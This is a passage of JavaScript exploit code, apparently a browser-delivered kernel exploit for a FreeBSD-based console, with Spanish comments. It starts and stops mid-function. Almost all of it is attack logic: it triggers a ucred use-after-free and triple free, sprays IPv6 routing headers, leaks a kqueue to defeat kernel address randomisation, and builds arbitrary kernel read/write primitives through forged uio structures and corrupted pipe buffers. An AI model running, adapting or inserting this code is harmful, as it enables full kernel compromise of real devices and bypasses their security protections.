            return w.rpc("fire", timeoutMs === undefined ? 3000 : timeoutMs, w.ctx.S.low, w.ctx.S.hi);
        }

        if (CFG_USE_REALTIME === 1) {
            mark("REALTIME-ENABLED", "pinning workers then main");
            prioDv.setUint16(0, RTP_PRIO_REALTIME, true); prioDv.setUint16(2, RTP, true);
            new Uint8Array(maskAb).fill(0); maskDv.setUint32(0, 1 << MAIN_CORE, true);
            for (const w of workers) {
                try {
                    await fireW(w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID, new int64(0xffffffff, 0xffffffff), 0x10, maskAddr], 3000);
                    await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr], 3000);
                } catch (pinErr) {
                    mark("WORKER-PIN-FAILED", w.name + " " + pinErr.message);
                    try { await w.rpc("disarm", 2000); w.armed = false; } catch (_) {}
                    try { w.worker.terminate(); } catch (_) {}
                }
            }
            const liveWorkers = workers.filter(w => w.armed && w.wired);
            workers.length = 0;
            for (const w of liveWorkers) workers.push(w);
            if (workers.length < 1) { state("WORKERS FAILED TO PIN -- reboot", "bad"); return; }
            const a = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, new int64(0xffffffff, 0xffffffff), 0x10, maskAddr).i32;
            const r = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
            check("main-thread-pinned-realtime", a === 0 && r === 0, "core=" + MAIN_CORE + " rtp=" + RTP);
        } else {
            mark("REALTIME-SKIPPED", "CFG_USE_REALTIME=0");
        }

        function tagFor(i) { return (RTHDR_TAG | (i & 0xffff)) >>> 0; }
        function readTag() {
            const v = leakDv.getUint32(4, true) >>> 0;
            return { ok: (v & 0xffff0000) >>> 0 === RTHDR_TAG, idx: v & 0xffff };
        }
        const sprayOk = new Array(NUM_IPV6_SOCK).fill(false);
        function findTwins(timeout) {
            for (let round = 0; round < timeout; ++round) {
                for (let i = 0; i < ipv6.length; ++i) {
                    if (burned.has(ipv6[i])) { sprayOk[i] = false; continue; }
                    sprayDv.setUint32(4, tagFor(i), true);
                    sprayOk[i] = setRthdr(ipv6[i]) === 0;
                }
                for (let i = 0; i < ipv6.length; ++i) {
                    if (R2_ON && !sprayOk[i]) continue;
                    if (getRthdr(ipv6[i], IP6_RTHDR0_SIZE, 8) < 0) continue;
                    const t = readTag();
                    if (t.ok && t.idx !== i && t.idx < ipv6.length && (!R2_ON || sprayOk[t.idx])) return { a: ipv6[i], b: ipv6[t.idx], round: round };
                }
                if ((round + 1) % 50 === 0) sc(SYS.sched_yield);
            }
            return null;
        }
        function findTriplet(master, slave, tag, timeout) {
            const baseRounds = timeout || MAX_ROUNDS_TRIPLET;
            let rounds = baseRounds, backoff = 0;
            while (backoff < 3) {
                const result = findTripletOnce(master, slave, tag, rounds);
                if (result) return result;
                backoff++; rounds = Math.min(rounds * 2, 2000);
                nanosleepMs(1);
            }
            return null;
        }
        function findTripletOnce(master, slave, tag, timeout) {
            const rounds = timeout || MAX_ROUNDS_TRIPLET;
            const seen = []; let untagged = 0;
            for (let round = 0; round < rounds; ++round) {
                for (let i = 0; i < ipv6.length; ++i) {
                    if (ipv6[i] === master || ipv6[i] === slave) continue;
                    if (burned.has(ipv6[i])) continue;
                    sprayDv.setUint32(4, tagFor(i), true); setRthdr(ipv6[i]);
                }
                const t = getRthdr(master, IP6_RTHDR0_SIZE, 8) < 0 ? { ok: false, idx: 0 } : readTag();
                if (!t.ok) untagged++;
                const fd = (t.ok && t.idx < ipv6.length) ? ipv6[t.idx] : -1;
                if (seen.length < 6) seen.push((t.ok ? t.idx + "->fd" + fd : "untagged"));
                if (fd !== -1 && fd !== master && fd !== slave && !burned.has(fd)) {
                    (/^(RE|UW)/.test(tag) ? trace : mark)("TRIPLET-" + tag, "round=" + round + " fd=" + fd + " untagged=" + untagged);
                    return fd;
                }
                if ((round + 1) % 100 === 0) sc(SYS.sched_yield);
            }
            mark("TRIPLET-" + tag + "-MISS", "master=" + master + " slave=" + slave + " rounds=" + rounds + " untagged=" + untagged + " first reads: " + seen.join(" "));
            return 0;
        }

        let bootErr = "";
        function bootFingerprint() {
            const nameAb = new ArrayBuffer(8), outAb = new ArrayBuffer(0x10);
            keepAlive.push(nameAb, outAb);
            const nameAddr = bufAddr(nameAb), outAddr = bufAddr(outAb);
            const nameDv = new DataView(nameAb);
            new Uint8Array(outAb).fill(0);
            const trials = [[1, 21], [1, 10], [1, 11]];
            for (const t of trials) {
                nameDv.setUint32(0, t[0], true); nameDv.setUint32(4, t[1], true);
                lenDv.setUint32(0, 0x10, true); lenDv.setUint32(4, 0, true);
                const rv = sc(SYS.sysctl, nameAddr, 2, outAddr, lenAddr, 0, 0).i32;
                const gotLen = lenDv.getUint32(0, true);
                if (rv === 0 && gotLen > 0) {
                    const o = new DataView(outAb);
                    const sec = o.getUint32(0, true);
                    if (sec !== 0) return t[0] + "," + t[1] + ":" + sec.toString(16) + ":" + o.getUint32(8, true).toString(16);
                    let h = 0;
                    for (let i = 0; i < 8; ++i) h = ((h << 8) ^ o.getUint8(i)) >>> 0;
                    return t[0] + "," + t[1] + ":h" + h.toString(16);
                }
                bootErr = "t=" + t[0] + "," + t[1] + " rv=" + rv + " errno=" + errno() + " oldlen=" + gotLen;
            }
            return null;
        }
        const boot = bootFingerprint();
        mark("BOOT", boot || bootErr);
        check("console-rebooted-since-last-committed", true, "boot=" + (boot || "none") + " (guard bypassed)");

        let twins = null, triplets = null;
        let uncontained = null;
        for (let attempt = 1; attempt <= NUM_ATTEMPT && !triplets; ++attempt) {
            if (uncontained) { mark("NO-RETRY-UNCONTAINED", "attempt=" + attempt + " reason=" + uncontained); break; }
            state("attempt " + attempt + "...", "warn");
            mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);
            try {
                const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
                const reg = netevent(dummy, NETEVENT_SET_QUEUE);
                if (reg.rv === -1) { mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err); sc(SYS.close, dummy); continue; }

                sc(SYS.close, dummy);
                sc(SYS.setuid, 1);
                uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                if (uafSock !== dummy) {
                    mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy + " got " + uafSock);
                    if (uafSock !== -1) sc(SYS.close, uafSock);
                    uafSock = 0;
                    continue;
                }
                sc(SYS.setuid, 1);
                const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
                mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv);
                committed = true;
                mark("PRE-SENDMSG", "sendmsg=" + SYS.sendmsg + " dup=" + SYS.dup + " close=" + SYS.close + " uafSock=" + uafSock);

                for (let i = 0; i < 0x80; ++i) sc(SYS.sendmsg, 0, msgAddr, 0);

                if (STOP_BEFORE_DOUBLE) { mark("STOP-BEFORE-DOUBLE", "withheld=dup+close"); rebootRequired = true; break; }

                const d1 = sc(SYS.dup, uafSock).i32;
                if (d1 === -1) { mark("ATTEMPT-SKIP", "dup failed"); rebootRequired = true; continue; }
                nanosleepMs(MS_DELAY);
                sc(SYS.close, d1);
                rebootRequired = true;
                mark("DOUBLE-FREE", "dup=" + d1 + " closed");

                twins = findTwins(MAX_ROUNDS_TWIN);
                if (!twins) {
                    if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                    mark("ATTEMPT-RETRY", "after=no-twins next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
                    continue;
                }
                mark("TWINS", "a=" + twins.a + " b=" + twins.b + " round=" + twins.round);

                freeRthdr(twins.b);
                let reclaimed = false, rounds = 0;
                function fireTracked(w) {
                    const t = fireW(w, SYS.recvmsg, [iovSs[0], msgAddr, 0], 0);
                    t.settled = false;
                    t.then(() => { t.settled = true; }, () => { t.settled = true; });
                    return t;
                }
                const tasks = new Array(iovWorkers.length);
                let parkedSeen = -1;
                for (let i = 0; i < NUM_IOV_SPRAY && !reclaimed; ++i) {
                    rounds = i + 1;
                    for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireTracked(iovWorkers[k]);
                    sc(SYS.sched_yield);
                    if (parkedSeen < 0) { await new Promise(r => setTimeout(r, 0)); parkedSeen = tasks.filter(t => !t.settled).length; mark("IOV-PARKED", parkedSeen + "/" + iovWorkers.length); }
                    if (getRthdr(twins.a, IP6_RTHDR0_SIZE, 8) >= 0 && leakDv.getInt32(0, true) === 1) { reclaimed = true; break; }
                    for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
                    await Promise.all(tasks);
                    for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
                }
                const rets = tasks.map(function (t, k) { return iovWorkers[k].ctx.frameDv.getInt32(0, true); });
                mark("IOV-RETS", "rounds=" + rounds + " recvmsg_rv=" + rets.join(","));
                check("cr_refcnt-driven-1", reclaimed, "rounds=" + rounds + " parked=" + parkedSeen + "/" + iovWorkers.length);
                if (!reclaimed) {
                    for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
                    await Promise.all(tasks);
                    for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
                    burn(twins.a, "refcount-drive"); burn(twins.b, "refcount-drive");
                    twins = null;
                    if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                    mark("ATTEMPT-RETRY", "after=refcount-drive burned=" + burned.size + " next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
                    continue;
                }

                const d2 = sc(SYS.dup, uafSock).i32;
                if (d2 === -1) { mark("ATTEMPT-SKIP", "second dup failed"); break; }
                sc(SYS.close, d2);
                mark("TRIPLE-FREE", "dup=" + d2 + " closed");

                const t0 = twins.a;
                const ptOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
                mark("POST-TRIPLE", "master=" + t0 + " twin=" + twins.b + " idx=" + (ptOk ? leakDv.getInt32(4, true) : "readfail") + " refcnt=" + (ptOk ? leakDv.getInt32(0, true) : "readfail"));
                const t1 = findTriplet(t0, -1, "T1", MAX_ROUNDS_TRIPLET);

                for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
                await Promise.all(tasks);
                for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
                const rets2 = tasks.map(function (t, k) { return iovWorkers[k].ctx.frameDv.getInt32(0, true); });
                const irOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
                mark("IOV-RELEASED", "recvmsg_rv=" + rets2.join(",") + " master_idx=" + (irOk ? leakDv.getInt32(4, true) : "readfail"));

                const t2 = findTriplet(t0, t1, "T2", MAX_ROUNDS_TRIPLET);
                if (t1 && t2) { triplets = [t0, t1, t2]; mark("TRIPLETS", triplets.join(",")); }
                else {
                    mark("TRIPLET-MISS", "t1=" + t1 + " t2=" + t2);
                    burn(t0, "triplet-miss");
                    if (t1) burn(t1, "triplet-miss");
                    if (twins && twins.b) burn(twins.b, "triplet-miss");
                    uncontained = "triplet-miss";
                }
            } catch (attemptErr) {
                mark("ATTEMPT-THREW", "attempt=" + attempt + " " + (attemptErr && attemptErr.message ? attemptErr.message : String(attemptErr)));
                twins = null;
                if (uafSock > 0) { try { sc(SYS.close, uafSock); } catch (_) { } uafSock = 0; }
                continue;
            }
        }

        check("ucred-triple-freed", !!triplets, triplets ? triplets.join(",") : "");
        if (!triplets) { mark("FAILED-STAGE", "stage=triple-free"); state("Sin triple free", "bad"); return; }
        mark("STEP10-SUMMARY", "committed=" + committed + " reboot=" + rebootRequired + " triplets=" + triplets.join(","));

        // ============================================================
        // make_karw
        // ============================================================
        let kernelBase = null, kqFdp = null, kqFd = -1;
        let kv = null;
        if (CFG_DO_MAKE_KARW === 1) {
            if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
                mark("KQUEUE-SKIPPED", "reason=no-k_kl_lock");
            } else {
                state("leaking a kqueue...", "warn");
                freeRthdr(triplets[2]);
                sc(SYS.sched_yield); sc(SYS.sched_yield);
                let leaked = false, tries = 0, magicNoFdp = 0, shortRead = 0;
                const held = [];
                for (let i = 0; i < NUM_LEAK_KQUEUE; ++i) {
                    tries = i + 1;
                    const kq = sc(SYS.kqueue).i32;
                    if (kq === -1) { mark("KQUEUE-EMFILE", "at=" + i + " held=" + held.length); while (held.length) sc(SYS.close, held.pop()); sc(SYS.sched_yield); continue; }
                    held.push(kq);
                    const got = getRthdr(triplets[0], KQUEUE_SIZE, 0xa0);
                    if (got < 0xa0) shortRead++;
                    const fdpLo = leakDv.getUint32(0x98, true);
                    const fdpHi = leakDv.getUint32(0x9c, true);
                    const magicOk = got >= 0xa0 && leakDv.getUint32(8, true) === KQ_HDR_MAGIC && leakDv.getUint32(12, true) === 0;
                    if (magicOk && (fdpLo !== 0 || fdpHi !== 0)) { kqFd = held.pop(); leaked = true; break; }
                    if (magicOk) magicNoFdp++;
                    if (held.length >= KQ_BATCH) { while (held.length) sc(SYS.close, held.pop()); sc(SYS.sched_yield); }
                    if (i && i % 500 === 0) mark("KQUEUE-ROUND", "i=" + i + " magic_no_fdp=" + magicNoFdp + " short=" + shortRead);
                }
                while (held.length) sc(SYS.close, held.pop());
                check("kqueue-reclaimed-freed-chunk", leaked, "tries=" + tries + " magic_no_fdp=" + magicNoFdp + " short_reads=" + shortRead + (leaked ? " fd=" + kqFd : ""));

                if (leaked) {
                    const klLock = new int64(leakDv.getUint32(0x60, true), leakDv.getUint32(0x64, true));
                    kqFdp = new int64(leakDv.getUint32(0x98, true), leakDv.getUint32(0x9c, true));
                    kernelBase = klLock.sub32(off.k_kl_lock);
                    mark("KQUEUE-LEAK", "kl_lock=" + klLock + " kq_fdp=" + kqFdp);
                    mark("KERNEL-BASE", kernelBase + " = kl_lock-0x" + off.k_kl_lock.toString(16));
                    check("kl_lock-kq_fdp-kernel-pointers", (klLock.hi >>> 0) === 0xffffffff && (kqFdp.hi >>> 0) >= 0xffff0000, "kl_lock.hi=" + hx(klLock.hi) + " kq_fdp.hi=" + hx(kqFdp.hi));
                    check("kernel-base-0x4000-aligned", (kernelBase.low & 0x3fff) === 0, "low=" + hx(kernelBase.low));
                    sc(SYS.close, kqFd);
                    triplets[2] = findTriplet(triplets[0], triplets[1], "KQ", MAX_ROUNDS_TRIPLET);
                    mark("POST-KQUEUE", "kq_fd=" + kqFd + " closed triplets=" + triplets.join(","));
                    check("triplets2-re-found-after-kqueue-leak", !!triplets[2], triplets.join(","));
                }
            }
        }

        // Utilidades kread/kwrite
        function fakeUio(uioIov, resid, rw) {
            new Uint8Array(iovAb).fill(0);
            put(iovDv, 0x00, uioIov);
            iovDv.setUint32(0x08, NUM_UIO_IOV, true);
            put(iovDv, 0x10, -1);
            put(iovDv, 0x18, resid);
            iovDv.setUint32(0x20, UIO_SYSSPACE, true);
            iovDv.setUint32(0x24, rw, true);
            put(iovDv, 0x28, 0);
        }
        function restoreRefcntIov() {
            new Uint8Array(iovAb).fill(0);
            put(iovDv, 0, 1); put(iovDv, 8, 1);
        }
        function tripletsUsable() {
            return triplets && triplets.length === 3 && triplets.every(fd => fd > 0 && ipv6.indexOf(fd) >= 0);
        }

        // *** FIX: landUio con try/catch + drain + yield cada 32 rounds ***
        async function landUio(size, forWrite, tasks) {
            if (!tripletsUsable()) { mark("UIO-LAND-REFUSED", "triplets="
                + triplets.join(",")); return null; }

            trace("UIO-LAND", "call=" + (forWrite ? "readv" : "writev")
                + " size=" + size);
            freeRthdr(triplets[2]);
            const uioDeadline = Date.now() + (params.has("uioms")
                ? parseInt(params.get("uioms"), 10) : 60000);
            for (let i = 0; i < NUM_UIO_SPRAY; ++i) {
                if ((i & 0x3f) === 0 && Date.now() > uioDeadline) {
                    mark("UIO-LAND-TIMEOUT", "rounds=" + i);
                    break;
                }
                if (i && i % 256 === 0) mark("UIO-LAND-ROUND", "i=" + i);
                for (let k = 0; k < uioWorkers.length; ++k)
                    tasks[k] = fireW(uioWorkers[k],
                        forWrite ? SYS.readv : SYS.writev,
                        [forWrite ? uioSs[0] : uioSs[1], uioIovAddr, NUM_UIO_IOV], 0);
                sc(SYS.sched_yield);

                if (getRthdr(triplets[0], IOVEC_SIZE) >= 0
                    && leakDv.getInt32(8, true) === NUM_UIO_IOV) {
                    return new int64(leakDv.getUint32(0, true),
                                     leakDv.getUint32(4, true));
                }
                // Wake parked workers
                if (forWrite) {
                    for (let k = 0; k < uioWorkers.length; ++k)
                        sc(SYS.write, uioSs[1], scratch, size);
                } else {
                    sc(SYS.read, uioSs[0], scratch, size);
                    for (let k = 0; k < uioWorkers.length; ++k)
                        sc(SYS.read, uioSs[0], scratch, size);
                }
                // *** try/catch para que un worker que falle no aborte el loop ***
                try { await Promise.all(tasks); } catch (_) { }
                // *** Drain extra bytes que el worker parked pudo haber dejado ***
                for (let k = 0; k < uioWorkers.length; ++k) {
                    try { sc(SYS.read, uioSs[0], scratch, 4); } catch (_) { }
                }
                if (!forWrite) sc(SYS.write, uioSs[1], scratch, size);

                // *** Yield al event loop cada 32 rounds para que el GC corra ***
                if ((i & 0x1f) === 0x1f) {
                    await new Promise(r => setTimeout(r, 0));
                }
            }
            return null;
        }

        async function landFakeUio(tasks) {
            if (!tripletsUsable()) { mark("FAKEUIO-REFUSED", "triplets=" + triplets.join(",")); return false; }
            freeRthdr(triplets[1]);
            const fakeDeadline = Date.now() + (params.has("fakeuioms") ? parseInt(params.get("fakeuioms"), 10) : 60000);
            for (let i = 0; i < NUM_IOV_SPRAY_MAX; ++i) {
                if ((i & 0x3f) === 0 && Date.now() > fakeDeadline) { mark("FAKEUIO-TIMEOUT", "rounds=" + i); break; }
                if (i && i % 500 === 0) mark("FAKEUIO-ROUND", "i=" + i);
                for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireW(iovWorkers[k], SYS.recvmsg, [iovSs[0], msgAddr, 0], 0);
                sc(SYS.sched_yield);
                if (getRthdr(triplets[0], UIO_SIZE + IOVEC_SIZE) >= 0 && leakDv.getUint32(0x20, true) === UIO_SYSSPACE) return true;
                for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
                try { await Promise.all(tasks); } catch (_) { }
                for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
                if ((i & 0x1f) === 0x1f) {
                    await new Promise(r => setTimeout(r, 0));
                }
            }
            return false;
        }
        async function releaseIov(itasks) {
            for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
            try { await Promise.all(itasks); } catch (_) { }
            for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
        }
        function tripletsAgree(why) {
            if (!tripletsUsable()) return false;
            const tags = [], refs = [];
            for (const fd of triplets) {
                if (getRthdr(fd, UCRED_SIZE, 8) < 0) return false;
                const v = leakDv.getUint32(4, true) >>> 0;
                if ((v & 0xffff0000) !== RTHDR_TAG) return false;
                tags.push(v);
                if (getRthdr(fd, UCRED_SIZE, 0x10) < 0) return false;
                const ref = leakDv.getUint32(0, true);
                if (ref === 0) return false;
                refs.push(ref);
            }
            return tags[0] === tags[1] && tags[1] === tags[2] && refs.every(r => r > 0);
        }
        function refindPair(tag) {
            for (let retry = 0; retry < 3; ++retry) {
                triplets[1] = findTriplet(triplets[0], -1, tag + "1", FIND_TRIPLET_FAST);
                triplets[2] = findTriplet(triplets[0], triplets[1], tag + "2", FIND_TRIPLET_FAST);
                if (tripletsUsable() && tripletsAgree(tag)) return true;
                sc(SYS.sched_yield);
            }
            mark("REFIND-UNVALIDATED", "tag=" + tag + " triplets=" + triplets.join(","));
            return false;
        }
        async function refindTriplets(itasks) { await releaseIov(itasks); if (refindPair("RE")) return true; mark("TRIPLETS-LOST", "triplets=" + triplets.join(",")); return false; }
        async function unwind(utasks, itasks, why, wakeUio, size, drainReads) {
            mark("KREAD-UNWIND", "why=" + why + " wake_uio=" + (wakeUio ? 1 : 0));
            try { if (wakeUio && utasks && utasks[0]) { const dsz = size || 8; for (let k = 0; k < (drainReads || 0); ++k) sc(SYS.read, uioSs[0], scratch, dsz); await Promise.all(utasks); } } catch (e) { mark("UNWIND-UIO-THREW", e.message); }
            try { if (itasks && itasks[0]) await releaseIov(itasks); } catch (e) { mark("UNWIND-IOV-THREW", e.message); }
            restoreRefcntIov();
            const ok = refindPair("UW");
            mark("KREAD-UNWOUND", "triplets=" + triplets.join(",") + " usable=" + ok);
            return ok;
        }
        const isKptr = v => !!v && (v.hi >>> 0) >= 0xffff0000;
        const kAligned = v => !!v && ((v.low >>> 0) & 7) === 0;
        function kaddrOk(v) { return isKptr(v) && kAligned(v); }

        async function kreadSlow(addr, size, pairs) {
            if (kreadPoisoned) { mark("KREAD-REFUSED", "reason=poisoned"); return null; }
            if (pairs) { for (const q of pairs) if (!kaddrOk(q.addr)) { mark("KREAD-REFUSED", "bad-pair-addr=" + q.addr); return null; } }
            else if (!kaddrOk(addr)) { mark("KREAD-REFUSED", "bad-addr=" + addr); return null; }
            if (!tripletsUsable()) { mark("KREAD-REFUSED", "triplets=" + triplets.join(",")); return null; }
            mark("KREAD-BEGIN", "addr=" + (pairs ? pairs.map(p2 => "" + p2.addr).join("+") : addr) + " size=" + size);
            const bufs = uioWorkers.map(function () {
                const ab = new ArrayBuffer(size); keepAlive.push(ab);
                new Uint8Array(ab).fill(0x41);
                return { ab: ab, addr: bufAddr(ab), dv: new DataView(ab) };
            });
            lenDv.setUint32(0, size, true);
            sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
            sc(SYS.write, uioSs[1], scratch, size);
            put(uioIovDv, 8, size);
            const utasks = new Array(uioWorkers.length);
            const uioIov = await landUio(size, false, utasks);
            if (!uioIov) { await unwind(utasks, null, "no-uio", true, size, 1); return null; }
            fakeUio(uioIov, size, UIO_WRITE);
            if (pairs) { for (let i = 0; i < pairs.length; ++i) { put(iovDv, 0x30 + IOVEC_SIZE * i, pairs[i].addr); put(iovDv, 0x38 + IOVEC_SIZE * i, pairs[i].size); } }
            else { put(iovDv, 0x30, addr); put(iovDv, 0x38, size); }
            const itasks = new Array(iovWorkers.length);
            const ok = await landFakeUio(itasks);
            if (!ok) { kreadPoisoned = true; await unwind(utasks, itasks, "no-fake-uio", false, size); return null; }
            sc(SYS.read, uioSs[0], scratch, size);
            let got = null, drained = 0;
            for (const b of bufs) {
                sc(SYS.read, uioSs[0], b.addr, size);
                drained++;
                if (!got && !(b.dv.getUint32(0, true) === 0x41414141 && b.dv.getUint32(4, true) === 0x41414141)) got = b.dv;
            }
            try { await Promise.all(utasks); } catch (_) { }
            restoreRefcntIov();
            await refindTriplets(itasks);
            return got;
        }
        async function kwriteSlow(dst, srcAddr, size) {
            if (kreadPoisoned) { mark("KWRITE-REFUSED", "reason=poisoned"); return false; }
            if (!kaddrOk(dst)) { mark("KWRITE-REFUSED", "bad-dst=" + dst); return false; }
            if (!tripletsUsable()) { mark("KWRITE-REFUSED", "triplets=" + triplets.join(",")); return false; }
            mark("KWRITE-BEGIN", "dst=" + dst + " size=" + size);
            lenDv.setUint32(0, size, true);
            sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
            put(uioIovDv, 8, size);
            const utasks = new Array(uioWorkers.length);
            const uioIov = await landUio(size, true, utasks);
            if (!uioIov) { await unwind(utasks, null, "no-uio", true, size, 0); return false; }
            fakeUio(uioIov, size, UIO_READ);
            put(iovDv, 0x30, dst); put(iovDv, 0x38, size);
            const itasks = new Array(iovWorkers.length);
            const ok = await landFakeUio(itasks);
            if (!ok) { kreadPoisoned = true; await unwind(utasks, itasks, "no-fake-uio", false, size); return false; }
            for (let k = 0; k < uioWorkers.length; ++k) sc(SYS.write, uioSs[1], srcAddr, size);
            try { await Promise.all(utasks); } catch (_) { }
            restoreRefcntIov();
            await refindTriplets(itasks);
            return true;
        }

        if (kernelBase && triplets) {
            const KREAD_TRIES = params.has("kreadtries") ? parseInt(params.get("kreadtries"), 10) : 4;
            async function kread8(a) {
                for (let t = 0; t < KREAD_TRIES; ++t) { const dv = await kreadSlow(a, 8); if (dv) return new int64(dv.getUint32(0, true), dv.getUint32(4, true)); if (kreadPoisoned || !tripletsUsable()) break; }
                return null;
            }
            async function kwrite8n(dst, srcAddr, n) {
                for (let t = 0; t < KREAD_TRIES; ++t) { if (await kwriteSlow(dst, srcAddr, n)) return true; if (kreadPoisoned || !tripletsUsable()) break; }
                return false;
            }
            const qw = (dv, o) => new int64(dv.getUint32(o, true), dv.getUint32(o + 4, true));
            async function kreadN(a, n) {
                for (let t = 0; t < KREAD_TRIES; ++t) { const dv = await kreadSlow(a, n); if (dv) return dv; if (kreadPoisoned || !tripletsUsable()) break; }
                return null;
            }
            async function kreadPairs(pairs) {
                let total = 0; for (const p2 of pairs) total += p2.size;
                for (let t = 0; t < KREAD_TRIES; ++t) { const dv = await kreadSlow(null, total, pairs); if (dv) return dv; if (kreadPoisoned || !tripletsUsable()) break; }
                return null;
            }
            const R3_ON = params.get("r3") !== "0";
            const R4_ON = params.get("r4") !== "0";

            const fdtOfiles = await kread8(kqFdp);
            mark("FDT-OFILES", "" + fdtOfiles);

            let mFp = null, sFp = null;
            const fdDelta = slavePipe[0] - masterPipe[0];
            const spanOk = R3_ON && fdtOfiles && fdDelta > 0 && (fdDelta + 1) * FILEDESCENT_SIZE <= 0x20;
            if (spanOk) {
                const span = await kreadN(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE), 0x20);
                if (span) { mFp = qw(span, 0); sFp = qw(span, fdDelta * FILEDESCENT_SIZE); }
                else mark("PIPE-FP-SPAN-MISS", "delta=" + fdDelta);
            }
            if (!mFp && fdtOfiles && !kreadPoisoned && tripletsUsable()) {
                mFp = await kread8(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
                sFp = await kread8(fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
            }
            mark("PIPE-FP", "master=" + (mFp || "?") + " slave=" + (sFp || "?") + " delta=" + fdDelta + " span=" + (spanOk ? 1 : 0));

            let mData = null, sData = null;
            if (R4_ON && mFp && sFp) {
                const both = await kreadPairs([{ addr: mFp, size: 8 }, { addr: sFp, size: 8 }]);
                if (both) { mData = qw(both, 0); sData = qw(both, 8); }
            }
            if (!mData && !kreadPoisoned && tripletsUsable()) {
                mData = mFp ? await kread8(mFp) : null;
                sData = sFp ? await kread8(sFp) : null;
            }
            mark("PIPE-FDATA", "master=" + (mData || "?") + " slave=" + (sData || "?"));

            const kptr = v => v && (v.hi >>> 0) >= 0xffff0000;
            if (kptr(mData) && kptr(sData) && mData.low === sData.low && mData.hi === sData.hi) {
                check("pipe-fdata-distinct", false, "both=" + mData);
                mark("MAKE-KARW-ABORTED", "reason=mdata-equals-sdata");
                mData = null;
            }
            if (check("ofiles-walk-reached-pipes", kptr(fdtOfiles) && kptr(mFp) && kptr(sFp) && kptr(mData) && kptr(sData), "")) {
                const pbAb = new ArrayBuffer(PIPEBUF_SIZEOF); keepAlive.push(pbAb);
                const pbAddr = bufAddr(pbAb), pbDv = new DataView(pbAb);
                new Uint8Array(pbAb).fill(0);
                pbDv.setUint32(0x0c, PIPE_PAGE, true);
                put(pbDv, 0x10, sData);
                mark("PIPEBUF-AIM", "at=" + mData + " size=0x" + PIPE_PAGE.toString(16) + " buffer=" + sData);
                const wrote = await kwrite8n(mData, pbAddr, PIPEBUF_SIZEOF);
                check("pipebuf-written-master-struct-pipe", wrote, "");

                if (wrote) {
                    for (const fd of [masterPipe[0], masterPipe[1], slavePipe[0], slavePipe[1]]) sc(SYS.fcntl, fd, F_SETFL, O_NONBLOCK);
                    const kvBufAb = new ArrayBuffer(PIPEBUF_SIZEOF);
                    const kvViewAb = new ArrayBuffer(0x40);
                    keepAlive.push(kvBufAb, kvViewAb);
                    const kvBufAddr = bufAddr(kvBufAb), kvBufDv = new DataView(kvBufAb);
                    const kvViewAddr = bufAddr(kvViewAb), kvViewDv = new DataView(kvViewAb);
                    new Uint8Array(kvBufAb).fill(0); kvBufDv.setUint32(0x0c, PIPE_PAGE, true);
                    kv = {
                        flush: function () {
                            sc(SYS.write, masterPipe[1], kvBufAddr, PIPEBUF_SIZEOF);
                            sc(SYS.read, masterPipe[0], kvBufAddr, PIPEBUF_SIZEOF);
                        },
                        kread: function (dst, src, n) {
                            put(kvBufDv, 0x10, src); kvBufDv.setUint32(0, n >>> 0, true);
                            this.flush();
                            return sc(SYS.read, slavePipe[0], dst, n).i32;
                        },
                        kwrite: function (dst, src, n) {
                            put(kvBufDv, 0x10, dst); kvBufDv.setUint32(0, n >>> 0, true);
                            this.flush();
                            return sc(SYS.write, slavePipe[1], src, n).i32;
                        },
                        read8: function (a) {
                            new Uint8Array(kvViewAb).fill(0);
                            this.kread(kvViewAddr, a, 8);
                            return new int64(kvViewDv.getUint32(0, true), kvViewDv.getUint32(4, true));
                        },
                    };
                    mark("KERNELVIEW", "master=" + masterPipe + " slave=" + slavePipe);

                    new Uint8Array(kvViewAb).fill(0);
                    kv.kread(kvViewAddr, kernelBase, 0x10);
                    const hdr = [];
                    for (let i = 0; i < 16; ++i) hdr.push(kvViewDv.getUint8(i));
                    mark("KV-READ", "kernel_base -> " + hdr.map(v => v.toString(16).padStart(2, "0")).join(" "));
                    const kvElfOk = check("kernelview-reads-kernel-elf-header", kvViewDv.getUint32(0, true) === 0x464c457f, "");

